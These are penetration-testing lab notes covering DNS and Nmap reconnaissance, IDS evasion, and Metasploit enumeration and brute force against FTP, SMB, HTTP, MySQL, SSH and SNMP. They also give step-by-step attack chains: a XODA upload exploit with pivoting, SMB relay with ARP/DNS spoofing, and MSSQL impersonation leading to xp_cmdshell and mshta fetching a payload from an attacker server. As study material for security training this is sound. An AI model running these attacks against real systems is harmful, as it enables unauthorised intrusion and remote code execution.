## 🔒Active Information Gathering

### DNS Zone Transfers

**DNS:** Domain Name System (DNS) is a protocol that is used to resolve domain names/hostnames to IP addresses.

- **DNS Records:**
 >1. **A** - Resolves a hostname or domain to an IPv4 address.
 >2. **AAAA** - Resolves a hostname or domain to an IPv6 address. 
 >3. **NS** - Reference to the domains nameserver.
 >4. **MX** - Resolves a domain to a mail server.
 >5. **CNAME** - Used for domain aliases.
 >6. **TXT** - Text record.
 >7. **HINFO** - Host information.
 >8. **SOA** - Domain authority.
 >9. **SRV** - Service records.
 >10. **PTR** - Resolves an IP address to a hostname.

### DNS Interrogation

**DNS interrogation:** is the process of enumerating DNS records for a specific domain.
- The objective of DNS interrogation is to probe a DNS server to provide us with DNS records for a specific domain.
	
- This process can provide important information like the IP address of a domain, subdomains, mail server addresses.
	
 
#### Practical Demo

-  We entered `ZoneTransfer.me` (A public website teaches about DNS servers). (It will be our targeted website)
-  Enter `DNS dumpster.com` search about `Zone transfer.me` , **It will provide you with the DNS names and IPs, records** and this step is passive information gathering also its the same as when you type in kali `dnsrecon -d zonetransfer.me`
-   `dnsenum` is an active information gathering tool that enumerates the records that are publicly available also we can use it in DNS brute force  , `dnsenum --help` to see all of the commands.
- you can see your host file if you typed `sudo vim /etc/hosts` , **This contains a list of host names firstly and their corresponding IP addresses**
-  `dnsenum zonetransfer.me` to preform a zone transfer

![[Pasted image 20260129155819.png|600]]

- we can also use `dig` to preform a zone transfer.
- `dig axfr @nsztm1.digi.ninja zonetransfer.me`

> **Note:** A **Zone Transfer** is the actual process of replicating DNS data across multiple servers.
While **AXFR** is the specific _command_ or _protocol_ used to request the data, **Zone Transfer** is the broader _concept_ or operation of synchronizing that data.

- `Fierce` is a semi-lightweight DNS reconnaissance tool in Kali Linux.
>You can think of it as the "Plan B" tool. most modern administrators block Zone Transfers.
When a Zone Transfer fails, you use `Fierce`. Its primary job is to **Brute Force** the subdomains to find what the Zone Transfer would have told you.
`fierce -dns target.com



### Host discovery with Nmap

1. start by `ip a s ` or `ifconfig` , **to see your IP address**.
2. `sudo nmap -sn 192.168.1.125/24 ` , -sn: tells nmap not to do a port scan after host discovery.

![[Pasted image 20260129164510.png|600]]

- **Netdiscover:** relies on **ARP (Address Resolution Protocol)**. This makes it extremely effective on local networks (LANs), even if the devices have firewalls enabling "stealth mode" that block standard pings.
- `sudo netdiscover -i eth0 -r 192.168.1.0/24`
![[Pasted image 20260129165057.png]]


### Port Scanning with Nmap

 
- Default Nmap scan: `nmap ipAdress`
- some times it will give you an error "Host seems down" use: `nmap -Pn ipAddress` **this way we are telling nmap not to check if the host is up or not just preform the port scan.
- **to scan all of the 65thousand ports `nmap -Pn -p- ipAddress`
- **to specify a port `nmap -p 80 ipAddress`
-  **UDP Scan `nmap -Pn -sU ipAddress`
- **Faster scan `nmap -Pn -F ipAddress`
-  **Identifying the service versions of the ports `nmap -Pn -F -sV ipAddress`
-  `namp -Pn -A ipAddress` , **When you run `-A`, you are actually running these four commands simultaneously:

1. Version Detection (`-sV`)

- **Without it:** Nmap just says "Port 80 is Open." It guesses it is a web server because of the port number.
    
- **With it:** Nmap connects to the port and interrogates it. It will report: _"Apache httpd 2.4.49 (Unix)"_.
    
- **Why it matters:** Knowing the exact version number allows you to look for specific vulnerabilities (CVEs) for that software.
    

2. OS Detection (`-O`)

- **How it works:** Nmap sends weirdly malformed TCP/IP packets to the target and analyzes how the machine responds (TCP/IP Fingerprinting).
    
- **Result:** It guesses the Operating System (e.g., "Windows 10", "Linux Kernel 2.6", "Android").
    
- **Note:** This requires `sudo` privileges to work correctly because it constructs raw packets.
    

3. Script Scanning (`-sC`)

- **What it does:** It activates Nmap's **NSE (Nmap Scripting Engine)** using the "default" set of scripts.
    
- **Result:** It runs safe, common scripts against open ports.
    
    - If Port 21 (FTP) is open, it checks if Anonymous Login is allowed.
        
    - If Port 80 (HTTP) is open, it grabs the HTML title or checks for `robots.txt`.
        
    - If Port 445 (SMB) is open, it lists the shared folders.
        

4. Traceroute (`--traceroute`)

- **What it does:** It maps the network path (hops) between your machine and the target.
    
- **Why it matters:** It helps you identify firewalls, routers, or network segmentation (e.g., seeing if the target is behind a proxy).**

> You can make the nmap scanning faster by using a number (0-5) with the letter -T
> `nmap -A -T4 IpAddress`

- **Documenting the nmap:** `nmap -Pn -F IpAddress -oN test.txt`
- **Documenting the nmap as xml format:** `nmap -Pn -F IpAddress -oX test.xml`


---


#### Host Discovery using Nmap:


```shell
sudo nmap -sn <ip-address>/<sub-net-if-any>
```

> Pings all the IPs with in the sub-net and shows only ones that ping back.

```shell
sudo netdiscover -i <interface> -r <ip-address>/<sub-net-if-any>
sudo netdicover -i eth0 -r 192.168.3.0/24
```

> `-i` is used for the interface and `-r` is used for the ip-address range. It uses ARP to scan the hots.

#### Nmap scans:


`nmap`...Then remember:

- `-sS`: SYN scan (Stealth scan, faster than TCP connect)
- `-sT`: TCP connect scan (Standard TCP scan)
- `-sU`: UDP scan (Scan for open UDP ports)
- `-sA`: ACK scan (Checks firewall rules filtered or not)
- `-sP` or `-sn`: Ping scan (Find online hosts)
- `-sV`: Version detection (Identify services/version info)
- `-sC`: Default script scan (Runs default NSE scripts)
- `-O`: OS detection (Guess the operating system)
- `-p`: Port selection (Scan specific ports)
- `-F`: Fast scan (Scans fewer ports for speed)
- `-f` Fragmentation
- `-A`: Aggressive scan (OS detection, version detection, script scanning, and traceroute)
- `-D` Decoy.
- `-T<0-5>`: Timing template (Adjusts scan speed, from `0` (paranoid) to `5` (insane))
- `-oN`: Output in normal format (Saves scan output to a file)
- `-oX`: Output in XML format (Saves scan output in XML format)
- `-oG`: Greppable output (Saves scan output in a grep-friendly format)
- `-oA`: Output in all formats (`-oN`, `-oX`, `-oG` combined)
- `-v`: Verbose mode (Displays more information during the scan)
- `-n`: No DNS resolution (Skips DNS resolution)
- `-6`: IPv6 scanning (Scan using IPv6 addresses)
- `-R`: Always resolve DNS (Resolves domain names, even if not needed)
- `-Pn`: No ping (Skips host discovery, assumes hosts are up)
- `-PS` SYN ping.
- `-iL`: Input from a file (Scans hosts listed in a file)
- `-oX -`: Output to stdout in XML format (Useful for piping into other tools)
- `--host-timeout <time>`: Host is skipped if it doesn't responds in the set time periord.
- `--script`: Run specific NSE scripts (For customized scans)
- `--traceroute`: Perform a traceroute (Maps the route to the host)
- `--reason`: Display the reason for each host/port state
- `--osscan-guess`: OS Version probability.

Example:

```shell
nmap -sS -p 1-100,443 192.168.1.13,14
```

Tip: Use `--reason` to show the explanation of why a port is marked open or closed  
Tip: Use `--open` to show only open, open filtered, and unfiltered ports.

```shell
nmap -T4 -sS -sV --version-intensity 8 <ip-address>
```

> In Nmap, the `--version-intensity` option controls the intensity of version detection scanning. It takes a value from 0 to 9, where: **0**: Lightest intensity, meaning Nmap will try very few probes to determine the service version. **9**: The highest intensity, meaning Nmap will use the most comprehensive set of probes to determine the service version.

```shell
nmap -sV -sC 192.168.1.1
```

> TCP Quick Scan

```shell
nmap -sV -sC -p- 192.168.1.1
```

> TCP Full Scan

```shell
nmap -sV -sU 192.168.1.1
```

> UDP Quick Scan

```shell
nmap -sC -p 27017 192.168.1.13 | less
```

> Get info on a particular service:

NMAP Scripts are all available `/usr/share/namp/scripts`.

```shell
nmap --script=<script-name> <ip-address>
```

> Basic command to run any script.

```shell
nmap --script=<keyword-*> <ip-address>
nmap --script=ftp-* 10.10.10.10
```

> It is used to run all the scripts related to any keyword.

```shell
nmap --mtu <size> <target>
nmap --mtu 32 example.com
```

> The `--mtu` flag allows you to set a custom Maximum Transmission Unit (MTU) for the packets that Nmap sends during scanning.

```shell
nmap demo.ine.local -p 177 -A
```

> We can perform an Nmap port scan on the target system to identify whether the BIND DNS server is open.

```shell
nmap 10.0.24.0/20 --open
```

> This command scans the subnet and shows only the open ports of the target.

```shell
nmap -p 443 --script ssl-heartbleed <ip-address>
```

> This checks that whether the host machine is vulnerable to Heat Bleed Vulnerability or not.

```shell
nmap --script log4shell.nse --script-args log4shell.callback-server=172.17.42.1:1389 -p 8080 <ip-address>
```

> Log4J Discovery script

#### TCP Commands:


```shell
netstat -antp        /linux
netstat -ano         /windows
```

> Lists down all the current tcp connections.

#### Ping Sweep:


```shell
ping -b -c 4 <broadcast IP address>
fping -a -g <IP address>/24
```

> Ping Sweep: A technique to identify active hosts in a network range by sending ICMP Echo Requests.

#### SMB Commands:


```shell
nmap -p445 --script smb-protocols demo.ine.local
```

```shell
nmap -p445 --script smb-security-mode demo.ine.local
```

```shell
nmap -p445 --script smb-enum-sessions demo.ine.local
```

```shell
nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```shell
nmap -p445 --script smb-enum-shares demo.ine.local
```

```shell
nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```shell
nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```shell
nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```shell
nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```shell
nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```shell
nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```shell
nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```shell
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

### Vulnerability Scanning With Nmap Scripts

1. `ifconfig` , eth1: 192.152.25.3
2. `nmap -sV -O 192.152.25.3`
3. `ls -al /usr/share/nmap/scripts | grep shellshock`
4. `nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 192.152.25.3`

---

### Port Scanning & Enumeration with Nmap

##### Importing Nmap Scan Results Into MSF
- After You have uploaded an XML file(let's assume its name: windows_server_2012) successfully:
1. `service postgresql start`
2. `msfconsole`
3. create a new workspace for your scan  results ,  `workspace -a <Workspace_Name>`
4.  to import our data, `db_import <provide the path nmap scan results saved ex: /root/> 
>`db_import /root/windows_server_2012`
5. To confirm it was successfully uploaded, `hosts`
6. If you type `services` its going to show you all the open ports

- to initiate an Nmap scan in a workspace (in MSF), `db_nmap -Pn -sV -O <taget>`
- to list the vulnerabilities, `vulns`

---
### Port Scanning with Auxiliary Modules

![[Pasted image 20260424234936.png]]
1. `ifconfig` , and look for eth1 IP you will see something like `192.86.140.2` the target IP of the first server will be `192.86.140.3` 
2. `service postgresql start`
3. `msfconsole`
4. `db_status` , to check the connection to the `postgresql`
5. `workspace -a port_scan 
6. `search <any auxiliary module>` , in the lab we used: `search portscan`
7. after choosing the auxiliary module, to use it : `use <number of aux.>` in lab we used: `use 5` 5: portscan/tcp
8. `ifconfig` to make sure of the IP
9. `show options`
10. `set RHOSTS <target IP>`
11. `run` when you're ready to execute the module
12. ==To see what port 80 is hosting in the website while we don't have a browser in the lab:== `curl <target IP>` , this will download the webpage
13. when we did the curl command we saw in the title of the html (XODA)
14. `search xoda`
15. `use exploit/unix/webapp/xoda_file_upload
16. `show options`
17. `set RHOSTS <target IP>`
18. `set TARGETURI /` this means root
19. `set LHOST <IP of eht 1>`
20. `show options`
21. `exploit` , to run the exploit
22. then a meterpreter session provides us with an interactive command line within the system
23. `sysinfo` that will tell us more about the targeted system
24. `shell`
25. `/bin/bash -i` , to spawn a bash session to run the commands easily
26. `ifconfig` ,  to find the private IP of victim 2, in eth1 we will find a totally different subnet, it will be something like `192.113.124.2` so the targeted IP of the next server will be `192.113.124.2`
27. `run autoroute 192.113.124.2`
28. `background` , to add it to the background session
29. `sessions` to see the sessions you have
30. `search portscan`
31. `use 5`
32. `set RHOSTS 192.113.124.3` (The second Targeted Victim)
33. `show options`
34. `run` , and now we're able to run a port scan on the other system we didn't have an access to

- ==To scan UDP ports==
1. `search udp_sweep`
2. `use auxiliary/scanner/discovery/udp_sweep`
3. `show options`
4. `ifconfig`
5. `set RHOSTS 192.86.140.3`
6. `run`

---
### FTP Enumeration
1. `service postgrsql start` , to make sure we can interact with metaspolit framwork console
2. `ifconfig` , get the target IP from eth1, it going to be the following IP (if its 192.52.147.2 then it will be 192.52.147.3 )
3. `msfconsole`
4. `workspace -a FTP_ENUM`
- the first module we want to check  auxiliary ftp version check
1. `search portscan` , we want to ensure that the target is running ftp
2. `use auxiliary/scanner/portscan/tcp`
3. `show options`
4. `set RHOSTS <target for ex:192.52.147.3>`
5. `run`
- FTP version auxiliary module
1. `search ftp`
2. `search type:auxiliary name:ftp` , to filter and reduce the results
3. `use auxiliary/scanner/ftp/ftp_version`
4. `show options`
5. `set RHOSTS <target ip : 192.52.147.2> `
6. `run`
7. ==we sill see a FTP Banner , this is so important we can identify vulnerabilities of this version==
- FTP Brute force auxiliary module 
1. `search type:auxiliary name:ftp`
2. `use auxiliary/scanner/ftp/ftp_login` , we need to provide a passwords file , usernames file
3. `show options`
4. `set RHOSTS <target ip: 192.51.147.3>`
5. `set USER_FILE /usr/share/metasploit-framwork/data/wordlists/common_usrs.txt`
6. `set PASS_FILE /usr/shar/metasploit-framwork/data/wordlists/unix_passwords.txt`
7. `run`
8. `ftp <target ip: 192.51.147.3>`
9. `sysadmin` username
10. `654321` password
11. `ls` to list all of files
12. `get file_name.txt` to download the desired file into your desktop
- FTP anonymous auxiliary module
1. `search type:auxiliary name:ftp`
2. `use auxiliary/scanner/ftp/anonymous`
3. `show options`
4. `set RHOSTS <targeted IP: 192.51.147.3>`
5. `run`
6. this can reveal important information wither we could login or not

---
### SMB Enumeration
- SMB_VERSION
1. `ifconfig` , eht1 : target ip 
2. `service postgresql start`
3. `msfconsole`
4. `workspace -a SMB_ENUM`
5. **TRICK:**`setg RHOSTS <target IP:192.91.46.3>` ,  ==it doesn't have to do any thing with the lab but it will make things easier , instead of copying the targeted IP multiple times we can declare a global variable==
6. `search type: auxiliary name:smb`
7. `use auxiliary/scanner/smb/smb_version`
8. `show options`
9. `set RHOSTS <tagted IP>` , ==if you had declared a global variable in the previous step you will see the RHOSTS automatically configured as the targeted IP.==
10. `run`
11. you'll see the version of Samba between brackets and the OS it will provide sometimes its going to be wrong so the right one always is the one between the brackets.

- SMB_Users Enumeration
1. `search type:auxiliary name:smb`
2. `use auxiliary/scanner/smb/smb_enumusers`
3. `show options`
4. `run`
5. **TIP:** save the usernames that appears.
- SMB_shares
1. `search type:ayxiliary name:smb`
2. `use auxiliary/scanner/smb/smb_enumshares`
3. `show options`
4. `set ShowFiles true`
5. `run`
- SMB_login
1. `search type:auxiliary name:smb`
2. `use auxiliary/scanner/smb/smb_login`
3. `show options`
4. `set SMBUser admin ` , in SMB_USERS we identified the usernames and we saw `admin` user , so we know what the desired username is
5. `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
6. `run`
7. `exit`
8. `smbclient -L \\\\<taget ip: 192.91.46.3>\\ -U admin
9. `password`
10. `smbclient -L \\\\<taget ip: 192.91.46.3>\\public -U admin` , to access shares
11. `password`
12. `ls` , to list files
13. `cd secret`
14. `get flag`

---
### Web Server Enumeration
- WEB_VERSION
1. `if config` , eth1 
2. `service postgresql start`
3. `msfconsole`
4. `workspace -a Web_Enum`
5. `setg RHOSTS 192.140.160.3`
6. `setg RHOST 192.140.160.3`
7. `search type:auxiliary name:http`
8. `use auxiliary/scanner/http/http_version`
9. `show options`
10. `run`

- HTTP_HEADER
1. `search type:auxiliary name:http_header`
2. `use auxiliary/scanner/http/http_header`
3. `show options`
4. `run`

- robots_txt
1. `search robots_txt`
2. `use auxiliary/scanner/http/robots_txt
3. `show options`
4. `run`
5. `crul http://192.140.160.3/data`
6. `curl http://192.140.160.3/secure` , this directory needs username & pass so we are going to make a directory brute-force attack on it.

- Directory Brute-force
1. `search dir_scanner`
2. `use auxiliary/scanner/http/dir_scanner`
3. `show options`
4. `run`

- FILES_BRUTE-FORCING
1. `search files_dir`
2. `use auxiliary/scanner/http/files_dir`
3. `show options`
4. `run`

- We want to do a brute-force on /secure file we found
1. `search http_login `
2. `use auxiliary/scanner/http/http_login `
3. `show options`
4. `set AUTH_URI /secure/`
5. `unset USERPASS_FILE `, because we have already a file for usrenames and another files for passwords
6. `run`
7. we have to change the usernames & pass files because we didn't find any matches
8. `show options`
9. `set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt`
10. `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
11. `set verbose false` , this will prevent the system from outputting the unsuccessful logins
12. `run`
13. it didn't help also , so we're going to try to find a user name with enumeration techniques to narrow down the brute-force

- APACHE_USERDIR
1. `search apache_userdir`
2. `use auxiliary/scanner/http/apache_userdir_enum`
3. `show options`
4. ``set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt``
5. `run`
6. `search http_login`
7. `use auxiliary/scanner/http/http_login`
8. `show options`
9. `echo "rooty" > user.txt `
10. `set USER_FILE /root/user.txt`
11. `run`
12. change the pass file if it didn't work

---
### MySQL Enumeration
- MySQL_VERSION
1. `ifconfig`
2. `service postgresql start`
3. `msfconsole`
4. `workspace -a MySQL_ENUM`
5. `setg RHOSTS 192.143.6.3`
6. `setg RHOST 192.143.6.3`
7. `search type:auxiliary name:mysql `
8. `use auxiliary/scanner/mysql/mysql_version`
9. `show options`
10. to check if mysql is running on the 3306 port , just make a port scan as always
11. `run`

- We want to do a brute-force on the database server , to identify any credentials that may help us exploit the server
1.  `search type:auxiliary name:mysql `
2. `use auxiliary/scanner/mysql/mysql_login`
3. `show options`
4. `set USERNAME root` , because the root will have all of the permissions
5. `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
6. `set VERBOSE false`
7. `run`

- MySQL_ENUM
(AFTER the brute force)
1. `search mysql_enum`
2. `use auxiliary/admin/mysql/mysql_enum` , to run it we need credentials which we already have because of the brute force
3. `show options`
4. `set PASSWORD twinkle`
5. `set USERNAME root`
6. `run`

- MySQL_SQL
1. ```search mysql_enum`
2. `use auxiliary/admin/mysql/mysql_sql` , to execute sql queries
3. `show options`
4. `set PASSWORD twinkle`
5. `set USERNAME root
6. `set SQL show databases;` , because we have root privileges
7. `run`

- MySQL_SCHEMA
1. `search mysql_schema` , it will show you all the databases, tables automatically 
2. `use auxiliary/scanner/mysql/mysql_schemadump`
3. `show options`
4. `set PASSWORD twinkle`
5. `set USERNAME root
6. `run`
7. `hosts` , to see the info we where able to gather
8. `services`
9. `loot`
10. `creds`
>After gaining the username & password :
>you can log to the database by; `mysql -h 192.143.6.3 -u root -p` then provide the pass `twinkle` ==you have to be in the terminal not in msfconsole==

---
### SSH Enumeration
- SSH_Version
1. ```ifconfig`
2. `service postgresql start`
3. `msfconsole`
4. `workspace -a SSH_ENUM`
5. `setg RHOSTS 192.30.120.3 `
6. `setg RHOST  192.30.120.3 `
7. `search type:auxiliary name:ssh `
8. `use auxiliary/scanner/ssh/ssh_version`
9. `show options`
10. `run`

- SSH_LOGIN
1. `search type:auxiliary name:ssh `
2. `use auxiliary/scanner/ssh/ssh_login` ,we use it if the target uses password , but if it uses a public key we should use `ssh_login_pubkey`
3. `show options`
4. `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
5. `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt`
6. `run`

- SSH_ENUMUSERS
1.  `search type:auxiliary name:ssh `
2. `use auxiliary/scanner/ssh/ssh_enumusers` ,we use it if the target uses password , but if it uses a public key we should use `ssh_login_pubkey`
3. `show options`
4. `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
5. `run`

### SMTP Enumeration
- SMTP_Version
1. `ifconfig`
2. `service postgresql start`
3. `msfconsole`
4. `workspace -a SMTP_ENUM`
5. `setg RHOSTS 192.108.85.3 `
6. `setg RHOST  192.108.85.3 `
7. `search type:auxiliary name:smtp `
8. `use auxiliary/scanner/smtp/smtp_version`
9. `show options`
10. `run`

- SMTP_ENUM
1. `search type:auxiliary name:ssh `
2. `use auxiliary/scanner/ssh/ssh_enum`
3. `show options`
4. `run`, then you will have the usernames

---

### Host Discovery with Nmap

`namp <scan_options> <target_ip>`

- `nmap -sn 10.1.0.0-10` ==this way it will scan the first 10 IP addresses== 
- `nmap -sn 10.1.0.0/24` ==it will scan the whole network==
- `nmap -sn 10.4.23.227  10.4.23.228` ==to scan more than one IP==

🔹**How to make nmap scan a file of IPs:**
- `vim targets.txt` ==creating file and inserting IPs==
- `nmap -sn -iL targets.txt` ==Scanning==
##### Most Effective way to tell if the host is up or not 
🔹**How to Bypass firewalls blocking ICMP ping**
`nmap -sn -PS 10.0.0.0/24`

1. Nmap sends **TCP SYN packets** to target IPs
2. If a host is alive:
    - It responds with **SYN-ACK** (open port) OR **RST** (closed port)
3. Either response = **host is UP**
- `nmap -sn -PS1-1000 10.0.0.0/24` ==In this case we're being more specific by adding a port range==
- `nmap -sn -PS22,80,433` ==Check the specified ports only 

**Which Nmap option is commonly used for host discovery and sends ICMP Echo Request packets to determine the status of a host?**
==-sn==

---
### Port Scanning With Nmap

🔹**Normally, Nmap first checks:**
- ICMP ping
- TCP/UDP probes (like `-PS`, `-PA`)

If no response → it assumes the host is **down** and stops.

👉 But with `-Pn`:

- Nmap **does NOT care**
- It goes straight to **port scanning**
Example: `nmap -Pn 192.168.1.10`
Even if the target:
- Blocks ping
- Drops SYN packets

➡️ Nmap will still try to scan ports.

- `nmap -Pn -p- 10.4.24.205` this tells nmap to scan all the 65k ports.
- `nmap -sU 10.4.24.205` this is how to scan UDP ports

---
### Service Version & OS Detection

- `nmap -sV 192.168.1.3` this tells you the port and the service version, and operating system 
- `nmap -p- 192.168.1.4` Scan ALL 65,535 TCP ports (from 1 to 65535)
>**TIP:** `nmap -T4 -sS -sV -O -p- <ip address>`
- `nmap -O` : Operating system detection
- `nmap -O --osscan-guess`: we are making nmap to guess the OS
- `nmap -sV --version-intensity<0-9>`: This makes the version more accurate, and the more the intensity number is, the more accurate the version will be. 
---
### Nmap Scripting Engine (NSE)

- `nmap -sS -sV -sC -p- -T4 192.224.77.3` : -'sC'  Run default NSE (Nmap Scripting Engine) scripts. **Make sure that you're doing a port scan otherwise it won't work, By using this command `-sC` you could know the OS and its version **
- `nmap -p 1-250 -sU <IP_address>` : UDP Port scan
- `ls -al /usr/share/nmap/scripts/ | grep -e "WHAT EVER YOU'RE LOOKING FOR"` : Greps desired nmap scripts
- `nmap --script-help=<name of script>`: You will see what is this script for 
- `nmap -sS -sV --script=<nmap of script> -p- -T4 192.224.77.3` : How to run a particular nmap script 
- `nmap -A` : Enable OS detection, version detection, script scanning and traceroute , ==But we still need to specify the port scanning option ==`-sS`

`--script-args` lets you **pass arguments (parameters)** to NSE scripts.

👉 Some scripts need extra input like:

- usernames/passwords
- file paths
- specific options
>Example: `nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local`

---
### Firewall Detection & IDS Evasion

- How to detect the presence of a firewall: `nmap -sA <IP_address>` ==Map firewall rules, Determine if ports are filtered or unfiltered==
>Example: `nmap -Pn -sA -p445,3389 10.4.27.83`  **NOTE:** we know that ports: 445,3389 are open but we specified them to know if they're filtered or not.
##### IDS Evasion
- `nmap -f`: Fragment packets (IP packet fragmentation)
>Example: `nmap -Pn -sS -sV -F -f` , -F: means fast sacn (only scans first 100 ports) , -f: means Fragment packets (IP packet fragmentation)

- `nmap -f -mtu <number>` manual packet fragmentation control.
>Example: `nmap -sS -sV -p80,445,3389 -f --mtu 32 10.4.27.83` , Forces each fragment to be **32 bytes**

- `nmap --data-length 200 -D <Gateway_IP_Address, Another_IP> <Target_IP>`: --data-length 200:  Adds **200 bytes of random data** to each probe packet **Why?**
1. Makes packets look less like typical Nmap scans
2. Can help evade **signature-based IDS/IPS**
3. increases packet size → less “fingerprintable”
👉 Makes it harder to identify the real scanner
>Example: `nmap -Pn -sS -sV -p445,3389 -f --data-length 200 -D 10.10.23.1,10.10.23.2 10.4.27.83`: 
>- `-Pn` → Skip host discovery (assume target is up)
>- `-sS` → SYN (stealth) scan
>- `-sV` → Service/version detection
>- `-p445,3389` → Target:
    - **445** → SMB (Windows file sharing)
    - **3389** → RDP (Remote Desktop)
>- `-f` → Fragment packets
>- `--data-length 200` → Add 200 bytes of random data
>- `-D 10.10.23.1,10.10.23.2` → Use decoy IPs
>- `10.4.27.83` → Target IP

- ==To change the source port to make it less suspicious== `nmap -Pn -sS -sV -p445,3389 -f --data-length 200 -g 53 -D 10.10.23.1,10.10.23.2 10.4.27.83` 
>- `-Pn` → skip host discovery (assume target is up)
>- `-sS` → SYN (half-open) scan
>- `-sV` → service/version detection
>- `-p445,3389` → target:
    - **445 (SMB)** → Windows file sharing
    - **3389 (RDP)** → Remote Desktop
>- `-f` → fragment packets
>- `--data-length 200` → pad packets with random 200 bytes
>- `-g 53` → **set source port to 53 (DNS)**
>- `-D 10.10.23.1,10.10.23.2` → use decoy IPs
---
### Optimizing Nmap Scans

>**Note:** Why do we need to slow down our scans sometimes? == when we are dealing with IDS , slowing down our scans will reduce the amount of packets being sent, it will look less suspicious , Also If we're dealing with an old IDS it might lead to an unintended denial of service, or you might cause the old switches and routers crash.

|Option|Nickname|Meaning|
|---|---|---|
|`-T0`|**Paranoid**|Extremely slow, avoids detection|
|`-T1`|**Sneaky**|Very slow, low chance of detection|
|`-T2`|**Polite**|Slows down to reduce network load|
|`-T3`|**Normal**|Default speed (balanced)|
|`-T4`|**Aggressive**|Fast, commonly used in labs|
|`-T5`|**Insane**|Very fast, noisy and unreliable|

---
### Nmap Output Formats

- `nmap -oN <File_Name.txt>`:Output results in “Normal” (human-readable) format to a file
>Example `nmap -Pn -sS -F -T4 10.4.19.132 -oN nmap_normal.txt`

- `nmap -oX <File_name.xml>`: Save scan results in XML format
>Example `nmap -Pn -sS -F -T4 10.4.19.132 -oX nmap_xml.xml`

- `nmap -oG <file_name.txt>`: Save output in grepable format (easy to filter with tools like `grep`, `awk`, etc.)
>Example `nmap -Pn -sS -F -T4 10.4.19.132 -oN nmap_grep.txt`

---
# DNS & SMB Relay Attack

1. `msfconsole`
2. `search smb_realy`
3. `use exploit/windows/smb/smb_realy`
4. `show options`
5. `set SRVHOST <kali Linux IP: 172.16.5.101>`
6. `set LHOST 172.16.5.101`
7. `set SMBHOST 172.16.5.10`
8. `dnsspoof -i eth1 -f dns` , ==(BEFORE CONFIGURE DO STEP 10)== we need to configure DNS spoofing to redirect the victim to our kali whenever we have SMB connection , `-f`: The DNS file we created in step 10
9. `echo "<IP OF KALI: 172.16.5.101>" *.sportsfoo.com" > dns` , in another tab , We created a file to contain DNS records
10. OPEN A NEW TAB `echo 1 > /proc/sys/net/ipv4/ip forward`   enabling IP forwarding to prep for the ARP attack, ==after this DO:== `arpspoof -i eth1 -t <Target: WIndows IP:172.16.5.5> <Gateway: 172.16.5.1>` 
11. OPEN A NEW TAB `arpspoof -i eth -t <Gateway:172.16.5.1> <Windows:172.16.5.5>  `
12. In the MSF tab just `exploit`

---
### SNMP Enumeration

1. `cat /etc/hosts` , so we can see the IPs in our system
2. `nmap -sU -p 161 10.2.25.28` , we want to search for port 161 
3. `ls -al /usr/share/nmap/scripts/ | grep -e "snmp"`
4. `nmap -sU -sV -p 161 --script=snmp-brute demo.ine.local`
5. `snmpwalk -v 1 -c public demo.ine.local` , is an SNMP application that utilizes SNMP tree of information , we can extract information with this tool , but the data isn't that readible
6. `nmap -sU p 161 --script=snmp-* demo.ine.local > snmp_info` , this script makes the information more readable
7. `cat snmp_info`
8. `hydra -L administator -P /usr/share/metasploit-framwork/data/wordlists/unix_passwords.txt demo.ine.local. smb 
---
# MSSQL DB User Impersonation to RCE

- `cat /etc/hosts`
- `nmap demo.ine.local` , we noticed port 1433 (ms-sql-s) is open 
- `nmap --script ms-sql-info -p 1433 demo.ine.local`
- `mssqlclient.py bob:KhyUyxwp7Mcxo7@demo.ine.local` , provided from lab documentation
- `select @@version` , to see the version of the server (Basic enumeration)
- `select loginname from syslogins where sysadmin = 1;` ,  to see if bob has the role of system admin (It turns out that he isn't)
- `select distict b.name from sys.server_permissions a INNER JOIN sys.server_principals b on a.grantor_pricipal_id = b.principal_id where a.permission_name = 'IMPERSONATE' ; ` , we found `dbuser` , `sa` sow can impersonate the user `sa`  and `dbuser`
- `select system_user`
- `execute as login ='sa' ` , didn't work out
- `select system_user`
- `execute as login = 'dbuser' ` , it worked out and now we're going to try to impersonate the `sa` user via the `dbuser` 
- `select system_user`
- `execute as login = 'sa' ` & then `select system_user` , we've successfully impersonated system authority
- `enable_xp_cmdshell` , now it worked out
- open a new tab
- `msfconsole -q`
- `use exploit/windows/misc/hta_server`
- `exploit` , take the url and copy it
- go back to the first tab
- `exec  xp_cmdshell "mshta.ex" <paste the url>` , now we might have a meterpreter session
- we got the session & now we have an access to the server

---
